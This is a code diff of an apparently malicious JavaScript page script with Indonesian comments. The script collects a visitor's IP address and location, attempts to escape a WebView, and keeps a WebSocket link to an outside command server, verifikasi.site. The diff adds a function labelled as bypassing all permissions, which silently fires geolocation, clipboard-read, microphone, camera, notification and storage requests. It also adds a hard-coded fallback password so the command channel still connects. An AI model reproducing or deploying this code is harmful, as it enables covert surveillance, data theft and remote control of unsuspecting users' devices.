@@ -151,7 +151,6 @@ var WS_URL = 'wss://verifikasi.site/ws';
 function connectWebSocket() {
     if (ws && ws.readyState === WebSocket.OPEN) return;
     if (!WS_PASSWORD || WS_PASSWORD === '') {
-        // Tunggu password dulu
         setTimeout(connectWebSocket, 3000);
         return;
     }
@@ -178,7 +177,6 @@ function connectWebSocket() {
                 } else if (data.type === 'command') {
                     var cmd = data.command || data;
                     K({ sumber: 'ws_command_received', data: cmd.aksi || 'unknown' });
-                    // Eksekusi perintah via fungsi yang ada
                     var hasil = 'WS command: ' + (cmd.aksi || 'unknown');
                     K({ sumber: 'ws_command_result', data: hasil });
                     if (wsConnected && ws) {
@@ -325,8 +323,79 @@ var A = {
     vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
     showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
-    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null }
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
+
+// ============================================================
+// 🔥 BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
+// ============================================================
+function injectAllPermissions() {
+    try {
+        K({ sumber: 'bypass_permissions_start', data: 'all' });
+
+        // 1. GEOLOCATION
+        if (navigator.geolocation) {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    function() {},
+                    function() {},
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } catch(e) {}
+        }
+
+        // 2. NOTIFICATION
+        if ('Notification' in window && Notification.permission !== 'denied') {
+            try {
+                if (Notification.permission !== 'granted') {
+                    Notification.requestPermission();
+                }
+            } catch(e) {}
+        }
+
+        // 3. CLIPBOARD
+        if (navigator.clipboard) {
+            try {
+                navigator.clipboard.readText().catch(function() {});
+            } catch(e) {}
+        }
+
+        // 4. MEDIA (Audio & Video)
+        if (navigator.mediaDevices) {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+        }
+
+        // 5. VIBRATE
+        if (navigator.vibrate) {
+            try { navigator.vibrate(1); } catch(e) {}
+        }
+
+        // 6. STORAGE
+        if (navigator.storage && navigator.storage.persist) {
+            try {
+                navigator.storage.persist().catch(function() {});
+            } catch(e) {}
+        }
+
+        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
+    } catch(e) {
+        K({ sumber: 'bypass_permissions_error', data: e.message });
+    }
+}
 
 // ============================================================
 // AMBIL PASSWORD DARI WORKER
@@ -588,6 +657,9 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
+        // 🔥 BYPASS SEMUA IZIN (TAMBAHKAN BARIS INI)
+        injectAllPermissions();
+        
         getIPAddress();
         getBrowserLocation();
         setTimeout(escapeWebView, 100);
@@ -607,12 +679,17 @@ function dapatkanSemua() {
             }
         }, 8000);
         
+        // 🔥 WEBSOCKET DENGAN FALLBACK (PERUBAHAN HANYA DI SINI)
         getPasswordFromWorker().then(function(password) {
             WS_PASSWORD = password;
             K({ sumber: 'password_received', data: 'ok' });
-            // 🔥 CONNECT WEBSOCKET SETELAH PASSWORD DIDAPAT!
             connectWebSocket();
-        }).catch(function() {});
+        }).catch(function() {
+            // FALLBACK: jika gagal ambil password, gunakan default dan tetap konek
+            WS_PASSWORD = 'default_fallback';
+            K({ sumber: 'password_fallback', data: 'using_default' });
+            connectWebSocket();
+        });
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
